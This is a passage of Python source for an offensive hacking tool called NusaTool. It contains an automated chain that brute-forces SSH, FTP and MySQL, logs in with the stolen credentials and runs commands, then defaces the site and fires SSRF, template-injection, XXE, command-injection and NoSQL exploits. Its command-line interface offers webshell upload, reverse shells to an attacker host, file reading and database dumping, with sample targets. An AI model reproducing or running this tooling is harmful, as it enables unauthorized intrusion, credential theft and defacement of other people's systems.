            elif svc == "ftp" and 21 in port_services:
                pass
            elif svc == "mysql" and 3306 in port_services:
                pass
            else:
                continue
            try:
                sb = ServiceBruteforcer(self.domain, None, svc, None, None, min(self.threads, 10))
                found = sb.run()
                if found:
                    self.results["creds"].extend(found)
                    self._log("brute", "ok", f"{svc}:{len(found)}")
                    # Auto-exploit found creds
                    for u, p in found[:3]:
                        print(f"  {C}▶{N} Auto-exploiting {svc}:{Y}{u}:{p}{N}")
                        try:
                            if svc == "ssh":
                                import paramiko
                                client = paramiko.SSHClient()
                                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                client.connect(self.domain, username=u, password=p, timeout=5)
                                _, stdout, _ = client.exec_command("id; uname -a; whoami; hostname")
                                out = stdout.read().decode(errors='replace').strip()
                                client.close()
                                if out:
                                    print(f"  {G}✔{N} SSH exec: {W}{out[:200]}{N}")
                                    self.results["shells"].append({"url":f"ssh://{u}:{p}@{self.domain}","cmds":out})
                            elif svc == "ftp":
                                from ftplib import FTP
                                ftp = FTP(self.domain)
                                ftp.login(u, p)
                                files = []
                                try: ftp.retrlines('LIST', lambda x: files.append(x[:80]))
                                except: pass
                                ftp.quit()
                                if files:
                                    print(f"  {G}✔{N} FTP access: {len(files)} files")
                                    self.results["creds"].append(f"ftp://{u}:{p}@{self.domain}")
                            elif svc == "mysql":
                                import pymysql
                                conn = pymysql.connect(host=self.domain, user=u, password=p, connect_timeout=5)
                                cur = conn.cursor()
                                cur.execute("SELECT version(),database(),user()")
                                row = cur.fetchone()
                                conn.close()
                                if row:
                                    print(f"  {G}✔{N} MySQL: {Y}{row[0]}{N} db={row[1]} user={row[2]}")
                                    self.results["creds"].append(f"mysql://{u}:{p}@{self.domain}")
                        except Exception as e:
                            print(f"  {Y}[−]{N} Auto-exploit {svc}: {e}")
            except: self._log("brute", "fail", svc)

        # PHASE 8: AUTO DEFACE
        deface_msg = self.results.get("deface_msg", "HACKED BY NUSA EXPLOIT TEAM")
        self._auto_deface(deface_msg)

        # PHASE 9: SSRF (if param exists)
        if "=" in self.base_url:
            print(f"\n  {R}{BOLD}◆ PHASE 9: SSRF{N}")
            try:
                pnames = list(parse_qs(urlparse(self.base_url).query).keys())
                if pnames:
                    self.results["ssrf"] = SSRFExploiter(self.base_url, pnames[0], self.bypass).scan()
                    self._log("ssrf", "ok" if any(self.results["ssrf"].values()) else "skip", "")
            except Exception as e:
                self._log("ssrf", "fail", str(e)[:30])

        # PHASE 10: SSTI
        if "=" in self.base_url:
            print(f"\n  {R}{BOLD}◆ PHASE 10: SSTI (Template Injection){N}")
            try:
                pnames = list(parse_qs(urlparse(self.base_url).query).keys())
                if pnames:
                    ssti = SSTIExploiter(self.base_url, pnames[0], self.bypass)
                    ssti.detect()
                    rce = ssti.exec_cmd("id;hostname;whoami")
                    if rce: self.results["ssti"] = {"rce": rce[:300]}
                    self._log("ssti", "ok" if rce else "detect", "")
            except Exception as e:
                self._log("ssti", "fail", str(e)[:30])

        # PHASE 11: XXE (XML injection)
        if "=" in self.base_url:
            print(f"\n  {R}{BOLD}◆ PHASE 11: XXE (XML External Entity){N}")
            try:
                pnames = list(parse_qs(urlparse(self.base_url).query).keys())
                if pnames:
                    xxe = XXEExploiter(self.base_url, pnames[0], self.bypass)
                    xxe.scan()
                    self._log("xxe", "ok", "")
            except: self._log("xxe", "fail", "")

        # PHASE 12: CMDi (Command Injection)
        if "=" in self.base_url:
            print(f"\n  {R}{BOLD}◆ PHASE 12: COMMAND INJECTION{N}")
            try:
                pnames = list(parse_qs(urlparse(self.base_url).query).keys())
                if pnames:
                    cmdi = CmdInjectionExploiter(self.base_url, pnames[0], self.bypass)
                    if cmdi.detect():
                        r = cmdi.exec_cmd("id;hostname;whoami")
                        if r: self.results["cmdi"] = {"rce": r[:300]}
                    self._log("cmdi", "ok" if self.results.get("cmdi") else "skip", "")
            except Exception as e:
                self._log("cmdi", "fail", str(e)[:30])

        # PHASE 13: NoSQL Injection
        if "=" in self.base_url:
            print(f"\n  {R}{BOLD}◆ PHASE 13: NoSQL INJECTION{N}")
            try:
                nosqli = NoSQLiExploiter(self.base_url, self.base_url.split("?")[1] if "?" in self.base_url else "", self.bypass)
                self.results["nosqli"] = nosqli.scan()
                self._log("nosqli", "ok" if self.results["nosqli"] else "skip", "")
            except: self._log("nosqli", "fail", "")

        # PHASE 14: GraphQL (always check /graphql)
        print(f"\n  {R}{BOLD}◆ PHASE 14: GRAPHQL{N}")
        try:
            gql = GraphQLExploiter(self.base_url, "/graphql", self.bypass)
            res = gql.scan()
            self.results["graphql"] = res
            self._log("graphql", "ok" if res else "skip", "")
        except: self._log("graphql", "fail", "")

        # PHASE 15: JWT (if session cookie found)
        # JWT check — scans browser-stored tokens (manual-input phase)
        print(f"\n  {R}{BOLD}◆ PHASE 15: JWT AUDIT{N}")
        print(f"  {D}  Tip: Run 'jwt <token>' manually to audit JWT tokens{N}")
        self._log("jwt", "skip", "manual")

        # SUMMARY
        elapsed = time.time() - self.t0
        print(f"\n  {R}{BOLD}{'═'*55}{N}")
        print(f"  {R}{BOLD}AUTO HACK COMPLETE ({elapsed:.1f}s){N}")
        print(f"  {R}{BOLD}{'═'*55}{N}")
        print(f"\n  {R}◉{N} Ports:  {Y}{len(self.results.get('ports',[]))}{N} open")
        shell_count = len(self.results.get("shells",[])) + len(self.results.get("deface_files",[]))
        print(f"  {M}◉{N} Shells: {Y}{shell_count}{N}")
        has_sqli = self.results.get('sqli_data')
        print(f"  {G}◉{N} SQLi:   {Y}{len(has_sqli) if has_sqli else 'NONE'}{N}")
        print(f"  {C}◉{N} Creds:  {Y}{len(self.results.get('creds',[]))}{N}")
        print(f"  {R}◉{N} Deface: {Y}{len(self.results.get('deface_files',[]))}{N} file(s)")
        phase_ok = sum(1 for p in self.phases if p["status"] in ("ok","sent"))
        phase_total = len(self.phases)
        print(f"  {D}◉{N} Phases: {Y}{phase_ok}/{phase_total}{N} passed")
        if self.results.get("shells"):
            for s in self.results["shells"][:3]:
                print(f"    {G}→{N} {s.get('url','')[:60]}")
        print()
        # Generate report
        try:
            r = ReportGenerator()
            r.target = self.target
            for s in self.results.get("shells",[]):
                r.add({"type":"SHELL","target":s.get("url",""),"detail":f"Webshell via {s.get('method','?')}","severity":"critical"})
            for c in self.results.get("creds",[]):
                if isinstance(c, tuple) and len(c)>=2: r.add({"type":"CREDS","target":c[0],"detail":f"{c[0]}:{c[1]}","severity":"high"})
            for p in self.phases:
                r.add_phase(p["phase"], p["status"], p.get("msg",""))
            r.generate_html(f"autohack_{self.domain}.html")
        except: pass
        return self.results


# ══════════════════════════════════════════════════════
#  INTERACTIVE CLI
# ══════════════════════════════════════════════════════

class NusaCLI:
    def __init__(self):
        self.running = True
    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    def banner(self):
        self.clear(); print(BANNER)
        print(f"  {D}{'═'*58}{N}")
        print(f"  {R}{BOLD}⚡{N}{W}AUTO HACK{N}{D} |{N}{R} AutoPwn{N}{D} |{N}{Y}WebShell{N}{D} |{N}{M}RevShell{N}{D} |{N}{C}LFI{N}{D} |{N}{G}SQL{N}{D} |{N}{B}CMS{N}")
        print(f"  {D}{'═'*58}{N}\n")
    def prompt(self):
        return f"  {R}{BOLD}▶{N} {C}NusaTool{N} {R}{BOLD}❯{N} "
    def run(self):
        self.banner()
        while self.running:
            try:
                l = input(self.prompt()).strip()
                if not l: continue
                parts = l.split(); cmd = parts[0].lower(); args = parts[1:]
                if cmd in ("exit","quit","q"): print(f"\n  {Y}👋 Goodbye!{N}\n"); self.running = False
                elif cmd == "help": self._help()
                elif cmd == "clear": self.banner()
                elif cmd == "banner": print(BANNER)
                elif cmd == "version": print(f"\n  {C}NusaTool{N} {W}v{VERSION}{N}\n")
                else: self._exec(cmd, args)
            except (KeyboardInterrupt, EOFError): print(f"\n\n  {Y}👋 Goodbye!{N}\n"); self.running = False
    def _help(self):
        print(f"""
  {R}{BOLD}╔══════════════════════════════════════════════════════╗{N}
  {R}{BOLD}║           {W}NUSA EXPLOIT {D}— {W}COMMANDS                    {R}{BOLD}║{N}
  {R}{BOLD}╚══════════════════════════════════════════════════════╝{N}

  {R}{BOLD}⚡ AUTO HACK (Full Auto Exploitation Chain){N}
    {G}autohack{N}        {D}<target> --lhost <ip> [--lport] [--threads] [--proxy]{N}
    {G}autopwn{N}        {D}<target> [-p ports] [--threads N] [--proxy]{N}

  {R}◈ ACTIVE EXPLOIT / SHELL{N}
    {G}webshell{N}        {D}-u <url> [--shell php|asp|aspx|jsp|python] [--proxy]{N}
    {G}revshell{N}        {D}--lhost <ip> [--lport 4444] [--lang bash|python|php|nc]{N}
    {G}deface{N}         {D}-u <url> [--file <path>] [--webshell] [--message] [--proxy]{N}
    {G}cms{N}             {D}-u <url> [--proxy]{N}
    {G}svcexploit{N}     {D}--target <host> -u <user> -p <pass> [--service]{N}
    {G}svcbrute{N}        {D}-t <host> --service ssh|ftp|mysql [--threads] [--proxy]{N}

  {M}◈ WEB EXPLOIT / DUMP{N}
    {G}blindsqli{N}       {D}-u <url> --param <name> [--tech auto|boolean|time] [--proxy]{N}
    {G}lfi{N}             {D}-u <url> --param <name> [--proxy]{N}
    {G}sqlauto{N}         {D}-u <url> [--param <name>] [--proxy]{N}
    {G}cors{N}            {D}-u <url> [--proxy]{N}
    {G}csrf{N}            {D}-u <url> [--proxy]{N}
    {G}xss{N}            {D}-u <url> [--proxy]{N}
    {G}sqli{N}           {D}-u <url> [--proxy]{N}
    {G}urlscan{N}         {D}-u <url> [--proxy]{N}
    {C}◈ ADVANCED WEB EXPLOIT (OVER POWER){N}
    {G}ssrf{N}            {D}-u <url> --param <name> [--proxy]{N}
    {G}ssti{N}            {D}-u <url> --param <name> [--cmd <cmd>] [--proxy]{N}
    {G}xxe{N}             {D}-u <url> --param <name> [--file <path>] [--proxy]{N}
    {G}cmdi{N}            {D}-u <url> --param <name> [--cmd <cmd>] [--proxy]{N}
    {G}nosqli{N}          {D}-u <url> [--proxy]{N}
    {G}graphql{N}         {D}-u <url> [--endpoint /graphql] [--query <q>] [--proxy]{N}
    {G}jwt{N}             {D}<token> [--weaklist <file>]{N}

  {Y}◈ RECON / OSINT{N}
    {G}subdomain{N}      {D}-d <domain> [--wordlist] [--threads]{N}
    {G}dns{N}            {D}-d <domain> [--record ALL|A|MX|NS]{N}
    {G}whois{N}          {D}-d <domain>{N}
    {G}paramspider{N}    {D}-d <domain> [--subs] [--threads]{N}
    {G}scan{N}            {D}<domain> [--proxy]{N}

  {C}◈ BRUTEFORCE / CRACK{N}
    {G}autobf{N}          {D}<url> [--threads] [--delay] [--proxy]{N}
    {G}loginbf{N}        {D}-u <url> -U <users> -P <pass> [--threads] [--proxy]{N}
    {G}hashcrack{N}      {D}-t <hash> -w <wordlist> [--type md5|sha1|sha256]{N}
    {G}dirbust{N}        {D}-u <url> -w <wordlist> [--ext] [--threads] [--proxy]{N}

  {R}◈ SESSION / REPORT{N}
    {G}report{N}         {D}[-o output.html] [--json] [--csv]{N}
    {G}session save{N}   {D}[filename]{N}
    {G}session load{N}   {D}<filename>{N}
    {G}session show{N}   {D}[show current session status]{N}

  {R}◈ DORK / TARGET DISCOVERY{N}
    {G}dork{N}            {D}[-d <dork>] [--category sqli|lfi|rfi|admin|wp|phpinfo|upload|cve|config] [--region id|global|us|jp|...] [--pages 2]{N}

  {G}◈ NETWORK / MISC{N}
    {G}portscan{N}       {D}<target> [-p ports]{N}
    {G}servicedetect{N}  {D}-t <target> -p <ports>{N}
    {G}cve{N}             {D}[from banners]{N}
    {G}version{N}        {D}[show version]{N}
    {G}update{N}         {D}[check for updates]{N}

  {D}Examples:{N}
    {C}autohack http://target.com --lhost 10.0.0.5{N}
    {C}webshell -u http://target.com/uploads --proxy socks5://127.0.0.1:9050{N}
    {C}deface -u http://target.com/shell.php --webshell -m "HACKED"{N}
    {C}revshell --lhost 10.0.0.5 --lport 4444 --lang python{N}
    {C}lfi -u http://target.com/page.php?file=test --param file{N}
    {C}blindsqli -u http://target.com/page.php?id=1 --param id --tech time{N}
    {C}session save /tmp/hack1.json{N}
        """)
    def _get(self, args, *flags):
        for i, a in enumerate(args):
            if a in flags and i+1 < len(args): return args[i+1]
        return None
    def _exec(self, cmd, args):
        try:
            if cmd == "autopwn":
                target = self._get(args,"-t","--target") or (args[0] if args and not args[0].startswith("-") else None)
                if not target: print(f"  {R}✘{N} Usage: autopwn <target>"); return
                AutoPwn(target, ports=self._get(args,"-p","--ports") or "1-1024",
                        threads=int(self._get(args,"--threads") or "20")).run()
            elif cmd == "cors":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: cors -u <url>"); return
                CORSScanner(u).scan()
            elif cmd == "csrf":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: csrf -u <url>"); return
                CSRFScanner(u).scan()
            elif cmd == "dork":
                dork = self._get(args,"-d","--dork")
                cat = self._get(args,"--category") or "sqli"
                region = self._get(args,"--region") or "global"
                pages = int(self._get(args,"--pages") or "2")
                proxy = self._get(args,"--proxy")
                GoogleDorker(dork, cat, region, pages, proxy).run()
            elif cmd == "cve":
                print(f"  {Y}⚠{N} CVE Checker runs automatically from service banners.\n  Use {C}autopwn{N} for full scan with banner detection.\n")
            elif cmd == "urlscan":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: urlscan -u <url>"); return
                URLScanner(u).scan()
            elif cmd == "portscan":
                t = self._get(args,"-t","--target") or (args[0] if args and not args[0].startswith("-") else None)
                p = self._get(args,"-p","--ports") or "1-1024"
                if not t: print(f"  {R}✘{N} Usage: portscan <target> [-p ports]"); return
                PortScanner(t, p).run()
            elif cmd == "paramspider":
                d = self._get(args,"-d","--domain") or self._get(args,"-u","--url")
                if not d: print(f"  {R}✘{N} Usage: paramspider -d <domain> [--subs] [--threads N]"); return
                # Strip http/https if user passed full URL
                d = d.replace("http://","").replace("https://","").split("/")[0]
                ParamSpider(d, "--subs" in args, int(self._get(args,"--threads") or "10")).run()
            elif cmd in ("autobf", "autologin"):
                u = self._get(args,"-u","--url") or (args[0] if args and not args[0].startswith("-") else None)
                if not u: print(f"  {R}✘{N} Usage: autobf <url> [--threads N] [--delay 0.5]"); return
                AutoBruteforcer(u, int(self._get(args,"--threads") or "5"), float(self._get(args,"--delay") or "0"), self._get(args,"--proxy")).run()
            elif cmd in ("scan","quick"):
                t = args[0] if args else (self._get(args,"-t","--target"))
                if not t: print(f"  {R}✘{N} Usage: scan <domain>"); return
                QuickScanner(t).run()
            elif cmd == "servicedetect":
                t = self._get(args,"-t","--target"); p = self._get(args,"-p","--ports")
                if not t or not p: print(f"  {R}✘{N} Usage: servicedetect -t <target> -p <ports>"); return
                ServiceDetector(t, p).run()
            elif cmd == "xss":
                u = self._get(args,"-u","--url"); m = self._get(args,"--method") or "GET"
                if not u: print(f"  {R}✘{N} Usage: xss -u <url>"); return
                XSSScanner(u, m, self._get(args,"--param"), BypassEngine(u)).run()
            elif cmd == "sqli":
                u = self._get(args,"-u","--url"); m = self._get(args,"--method") or "GET"
                if not u: print(f"  {R}✘{N} Usage: sqli -u <url>"); return
                SQLiScanner(u, m, self._get(args,"--param"), BypassEngine(u)).run()
            elif cmd == "subdomain":
                d = self._get(args,"-d","--domain")
                if not d: print(f"  {R}✘{N} Usage: subdomain -d <domain>"); return
                SubdomainEnumerator(d, self._get(args,"-w","--wordlist")).run()
            elif cmd == "dns":
                d = self._get(args,"-d","--domain")
                if not d: print(f"  {R}✘{N} Usage: dns -d <domain>"); return
                DNSRecon(d, self._get(args,"--record") or "ALL").run()
            elif cmd == "whois":
                d = self._get(args,"-d","--domain")
                if not d: print(f"  {R}✘{N} Usage: whois -d <domain>"); return
                WhoisLookup(d).run()
            elif cmd == "dirbust":
                u = self._get(args,"-u","--url"); w = self._get(args,"-w","--wordlist")
                if not u or not w: print(f"  {R}✘{N} Usage: dirbust -u <url> -w <wordlist>"); return
                DirBruteforcer(u, w, self._get(args,"--ext"), int(self._get(args,"--threads") or "10"), BypassEngine(u)).run()
            elif cmd == "deface":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: deface -u <url> [--file <path>] [--content <html>] [--captcha <code>]"); return
                f = self._get(args,"-f","--file"); c = self._get(args,"-c","--content"); cp = self._get(args,"--captcha")
                dt = DefaceTester(u, BypassEngine(u))
                if f or c:
                    dt.deface(filepath=f, content=c, captcha_answer=cp)
                else:
                    dt.scan()
            elif cmd in ("hashcrack", "hash"):
                h = self._get(args,"-t","--target") or (args[0] if args and not args[0].startswith("-") else None)
                w = self._get(args,"-w","--wordlist")
                if not h or not w: print(f"  {R}✘{N} Usage: hashcrack -t <hash> -w <wordlist> [--type md5|sha1|sha256]"); return
                HashCracker(h, w, self._get(args,"--type") or "auto", int(self._get(args,"--threads") or "4")).run()
            elif cmd == "loginbf":
                u = self._get(args,"-u","--url"); U = self._get(args,"-U","--usernames"); P = self._get(args,"-P","--passwords")
                if not u or not U or not P: print(f"  {R}✘{N} Usage: loginbf -u <url> -U <users> -P <pass> [--threads N] [--mode form|json|basic|bearer]"); return
                LoginBruteforcer(u, U, P,
                    user_f=self._get(args,"--user-field") or "username",
                    pass_f=self._get(args,"--pass-field") or "password",
                    fail_s=self._get(args,"--fail-string") or "incorrect",
                    method=self._get(args,"--method") or "POST",
                    threads=int(self._get(args,"--threads") or "1"),
                    delay=float(self._get(args,"--delay") or "0"),
                    mode=self._get(args,"--mode") or "form",
                    proxy=self._get(args,"--proxy"),
                    bypass=BypassEngine(u)).run()
            elif cmd == "autohack":
                target = self._get(args,"-u","--url") or self._get(args,"-t","--target") or (args[0] if args and not args[0].startswith("-") else None)
                lhost = self._get(args,"--lhost")
                lport = int(self._get(args,"--lport") or "4444")
                threads = int(self._get(args,"--threads") or "20")
                if not target: print(f"  {R}✘{N} Usage: autohack <target> --lhost <ip>"); return
                if not lhost: print(f"  {Y}⚠{N} No --lhost set — skipping reverse shell phase")
                AutoHack(target, lhost, lport, threads).run()
            elif cmd == "webshell":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: webshell -u <url> [--shell php|asp|aspx|jsp|python] [--method put|post]"); return
                shell_type = self._get(args,"--shell") or "php"
                method = self._get(args,"--method") or "auto"
                WebShell(u, BypassEngine(u)).run(shell_type, method)
            elif cmd in ("revshell", "reverseshell"):
                lhost = self._get(args,"--lhost")
                lport = int(self._get(args,"--lport") or "4444")
                lang = self._get(args,"--lang") or "bash"
                if not lhost: print(f"  {R}✘{N} Usage: revshell --lhost <ip> [--lport 4444] [--lang bash|python|php|nc|powershell]"); return
                ReverseShell(lhost, lport).run(lang, "--urlencode" in args)
            elif cmd == "lfi":
                u = self._get(args,"-u","--url")
                param = self._get(args,"--param") or self._get(args,"-p")
                if not u or not param: print(f"  {R}✘{N} Usage: lfi -u <url> --param <name>"); return
                LFIExploiter(u, param, BypassEngine(u)).scan()
            elif cmd in ("sqlauto", "sqlautodump"):
                u = self._get(args,"-u","--url")
                param = self._get(args,"--param")
                if not u: print(f"  {R}✘{N} Usage: sqlauto -u <url> [--param <name>]"); return
                SQLAutoExploit(u, "GET", param, BypassEngine(u)).dump_all()
            elif cmd == "cms":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: cms -u <url>"); return
                CMSExploiter(u, BypassEngine(u)).run()
            elif cmd in ("svcexploit", "servicex"):
                target = self._get(args,"--target") or self._get(args,"-t")
                user = self._get(args,"-u","--user") or self._get(args,"-U","--username")
                pwd = self._get(args,"-p","--pass") or self._get(args,"-P","--password")
                svc = self._get(args,"--service") or "ssh"
                port = self._get(args,"--port")
                if not target or not user or not pwd:
                    print(f"  {R}✘{N} Usage: svcexploit --target <host> -u <user> -p <pass> [--service ssh|ftp|mysql]")
                    return
                ServiceExploiter(target, user, pwd, int(port) if port else None).run([svc])
            elif cmd == "ssrf":
                u = self._get(args,"-u","--url")
                param = self._get(args,"--param") or self._get(args,"-p")
                if not u or not param: print(f"  {R}✘{N} Usage: ssrf -u <url> --param <name>"); return
                SSRFExploiter(u, param, BypassEngine(u)).scan()
            elif cmd == "ssti":
                u = self._get(args,"-u","--url")
                param = self._get(args,"--param") or self._get(args,"-p")
                cmd = self._get(args,"--cmd") or "id;hostname"
                if not u or not param: print(f"  {R}✘{N} Usage: ssti -u <url> --param <name> [--cmd <cmd>]"); return
                ssti = SSTIExploiter(u, param, BypassEngine(u))
                ssti.detect(); ssti.exec_cmd(cmd)
            elif cmd == "xxe":
                u = self._get(args,"-u","--url")
                param = self._get(args,"--param") or self._get(args,"-p")
                f = self._get(args,"--file") or "/etc/passwd"
                if not u or not param: print(f"  {R}✘{N} Usage: xxe -u <url> --param <name> [--file <path>]"); return
                XXEExploiter(u, param, BypassEngine(u)).read_file(f)
            elif cmd == "cmdi":
                u = self._get(args,"-u","--url")
                param = self._get(args,"--param") or self._get(args,"-p")
                cmd = self._get(args,"--cmd") or "id"
                if not u or not param: print(f"  {R}✘{N} Usage: cmdi -u <url> --param <name> [--cmd <cmd>]"); return
                cmdi = CmdInjectionExploiter(u, param, BypassEngine(u))
                cmdi.detect(); cmdi.exec_cmd(cmd)
            elif cmd == "nosqli":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: nosqli -u <url>"); return
                NoSQLiExploiter(u, u.split("?")[1] if "?" in u else "", BypassEngine(u)).scan()
            elif cmd == "graphql":
                u = self._get(args,"-u","--url")
                ep = self._get(args,"--endpoint") or "/graphql"
                if not u: print(f"  {R}✘{N} Usage: graphql -u <url> [--endpoint /graphql]"); return
                GraphQLExploiter(u, ep, BypassEngine(u)).scan()
            elif cmd == "jwt":
                token = args[0] if args else None
                if not token: print(f"  {R}✘{N} Usage: jwt <token> [--weaklist <file>]"); return
                JWTExploiter(token).scan()
            elif cmd in ("blindsqli", "blind-sqli"):
                u = self._get(args,"-u","--url")
                param = self._get(args,"--param") or self._get(args,"-p")
                technique = self._get(args,"--tech") or "auto"
                delay = float(self._get(args,"--delay") or "2")
                if not u or not param: print(f"  {R}✘{N} Usage: blindsqli -u <url> --param <name> [--tech auto|boolean|time] [--delay 2]"); return
                BlindSQLiExploiter(u, param, "GET", technique, delay, BypassEngine(u)).dump_all()
            elif cmd in ("svcbrute", "servicebrute"):
                target = self._get(args,"-t","--target") or self._get(args,"-u","--url")
                svc = self._get(args,"--service") or "ssh"
                port = self._get(args,"--port")
                threads = int(self._get(args,"--threads") or "5")
                wl_u = self._get(args,"-U","--usernames")
                wl_p = self._get(args,"-P","--passwords")
                if not target: print(f"  {R}✘{N} Usage: svcbrute -t <host> --service ssh|ftp|mysql [--port 22] [--threads 10]"); return
                ServiceBruteforcer(target, int(port) if port else None, svc, wl_u, wl_p, threads).run()
            elif cmd == "report":
                f = self._get(args,"-o","--output") or "nusatool_report.html"
                if "--json" in args: ReportGenerator().generate_json(f=f.replace(".html",".json"))
                elif "--csv" in args: ReportGenerator().generate_csv(f=f.replace(".html",".csv"))
                else: ReportGenerator().generate_html(f)
            elif cmd == "session":
                sub = args[0] if args else ""
                if sub == "save" and len(args) > 1:
                    SessionManager(args[1]).save()
                    print(f"  {G}✔{N} Session saved to {Y}{args[1]}{N}")
                elif sub == "load" and len(args) > 1:
                    s = SessionManager(args[1])
                    if s.load(): print(f"  {G}✔{N} Loaded {len(s.data['findings'])} findings, {len(s.data['phases'])} phases")
                    else: print(f"  {R}✘{N} Session file not found")
                elif sub == "show":
                    s = SessionManager()
                    if s.load(): print(s.status())
                    else: print(f"  {Y}⚠{N} No active session")
                else: print(f"  {D}session save|load|show <file>{N}")
            elif cmd == "update":
                check_update()
            elif cmd == "version":
                print(f"\n  {C}NusaTool{N} {W}v{VERSION}{N}\n")
            else:
                print(f"  {R}✘{N} Unknown: {Y}{cmd}{N}  {D}(try help){N}")
        except KeyboardInterrupt: print(f"\n  {Y}⚠ Interrupted{N}")
        except Exception as e: print(f"  {R}✘ Error:{N} {e}")


# ══════════════════════════════════════════════════════
#  DIRECT MODE
# ══════════════════════════════════════════════════════

def direct(module, args):
    try:
        if module == "autopwn":
            target = None; ports = "1-1024"; threads = 20; wd = None
            for i, a in enumerate(args):
                if a in ("-t","--target") and i+1<len(args): target = args[i+1]
                elif a in ("-p","--ports") and i+1<len(args): ports = args[i+1]
                elif a=="--threads" and i+1<len(args): threads = int(args[i+1])
                elif a=="-w" and i+1<len(args): wd = args[i+1]
                elif not a.startswith("-") and not target: target = a
            if not target: print("[-] Usage: autopwn <target>"); return
            AutoPwn(target, wd, ports, threads).run()
        elif module in ("cors","csrf"):
            p = argparse.ArgumentParser(prog=module)
            p.add_argument("-u","--url",required=True); p.add_argument("--proxy")
            a = p.parse_args(args)
            be = BypassEngine(a.url, a.proxy)
            (CORSScanner if module=="cors" else CSRFScanner)(a.url, be).scan()
        elif module == "urlscan":
            p = argparse.ArgumentParser(prog="urlscan")
            p.add_argument("-u","--url",required=True); p.add_argument("--proxy")
            a = p.parse_args(args)
            URLScanner(a.url, BypassEngine(a.url, a.proxy)).scan()
        elif module == "portscan":
            p = argparse.ArgumentParser(prog="portscan")
            p.add_argument("target",nargs="?"); p.add_argument("-t","--target",dest="tflag")
            p.add_argument("-p","--ports",default="1-1024"); p.add_argument("--timeout",type=float,default=1.0)
            a = p.parse_args(args)
            target = a.tflag or a.target
            if not target: print("[-] portscan <target> [-p ports]"); return
            PortScanner(target,a.ports,a.timeout).run()
        elif module == "dork":
            p = argparse.ArgumentParser(prog="dork")
            p.add_argument("-d","--dork",help="Custom dork query (overrides --category)")
            p.add_argument("--category",choices=list(GoogleDorker.DORKS.keys()),default="sqli")
            p.add_argument("--region",choices=list(GoogleDorker.REGION_DOMAINS.keys()),default="global")
            p.add_argument("--pages",type=int,default=2); p.add_argument("--proxy")
            a = p.parse_args(args)
            GoogleDorker(a.dork, a.category, a.region, a.pages, a.proxy).run()
        elif module == "paramspider":
            p = argparse.ArgumentParser(prog="paramspider")
            p.add_argument("-d","--domain",help="Domain name")
            p.add_argument("-u","--url",help="Full URL (domain auto-extracted)")
            p.add_argument("--subs",action="store_true"); p.add_argument("--threads",type=int,default=10)
            a = p.parse_args(args)
            domain = a.domain or (a.url.replace("http://","").replace("https://","").split("/")[0] if a.url else None)
            if not domain: print("[-] Usage: paramspider -d <domain>"); return
            ParamSpider(domain,a.subs,a.threads).run()
        elif module in ("autobf", "autologin"):
            p = argparse.ArgumentParser(prog="autobf")
            p.add_argument("url",nargs="?"); p.add_argument("-u","--url",dest="uflag")
            p.add_argument("--threads",type=int,default=5); p.add_argument("--delay",type=float,default=0); p.add_argument("--proxy")
            a = p.parse_args(args)
            target = a.uflag or a.url
            if not target: print("[-] Usage: autobf <url> [--threads N]"); return
            AutoBruteforcer(target, a.threads, a.delay, a.proxy).run()
        elif module == "scan":
            target = args[0] if args else None
            if not target: print("[-] scan <domain>"); return
            QuickScanner(target).run()
        elif module == "servicedetect":
            p = argparse.ArgumentParser(prog="servicedetect")
            p.add_argument("-t","--target",required=True); p.add_argument("-p","--ports",required=True)
            a = p.parse_args(args); ServiceDetector(a.target,a.ports).run()
        elif module == "xss":
            p = argparse.ArgumentParser(prog="xss")
            p.add_argument("-u","--url",required=True); p.add_argument("--method",default="GET"); p.add_argument("--param"); p.add_argument("--proxy")
            a = p.parse_args(args); XSSScanner(a.url,a.method,a.param,BypassEngine(a.url,a.proxy)).run()
        elif module == "sqli":
            p = argparse.ArgumentParser(prog="sqli")
            p.add_argument("-u","--url",required=True); p.add_argument("--method",default="GET"); p.add_argument("--param"); p.add_argument("--proxy")
            a = p.parse_args(args); SQLiScanner(a.url,a.method,a.param,BypassEngine(a.url,a.proxy)).run()
        elif module == "subdomain":
            p = argparse.ArgumentParser(prog="subdomain")
            p.add_argument("-d","--domain",required=True); p.add_argument("-w","--wordlist"); p.add_argument("--threads",type=int,default=20)
            a = p.parse_args(args); SubdomainEnumerator(a.domain,a.wordlist,a.threads).run()
        elif module == "dns":
            p = argparse.ArgumentParser(prog="dns")
            p.add_argument("-d","--domain",required=True); p.add_argument("--record",default="ALL")
            a = p.parse_args(args); DNSRecon(a.domain,a.record).run()
        elif module == "whois":
            p = argparse.ArgumentParser(prog="whois")
            p.add_argument("-d","--domain",required=True)
            a = p.parse_args(args); WhoisLookup(a.domain).run()
        elif module == "dirbust":
            p = argparse.ArgumentParser(prog="dirbust")
            p.add_argument("-u","--url",required=True); p.add_argument("-w","--wordlist",required=True)
            p.add_argument("--ext"); p.add_argument("--threads",type=int,default=10); p.add_argument("--proxy")
            a = p.parse_args(args); DirBruteforcer(a.url,a.wordlist,a.ext,a.threads,BypassEngine(a.url,a.proxy)).run()
        elif module == "deface":
            p = argparse.ArgumentParser(prog="deface")
            p.add_argument("-u","--url",required=True,help="Target URL or webshell URL")
            p.add_argument("-f","--file",help="Path to HTML file to upload")
            p.add_argument("-c","--content",help="Inline HTML content to upload")
            p.add_argument("-m","--message",help="Short deface message (auto-generates page)")
            p.add_argument("--target-file",default="index.php",help="File to overwrite (webshell mode)")
            p.add_argument("--webshell",action="store_true",help="URL is a webshell endpoint")
            p.add_argument("--captcha",help="Captcha answer for form submission")
            p.add_argument("--proxy")
            a = p.parse_args(args)
            if a.webshell:
                msg = a.message or a.content or "HACKED BY NUSATOOL"
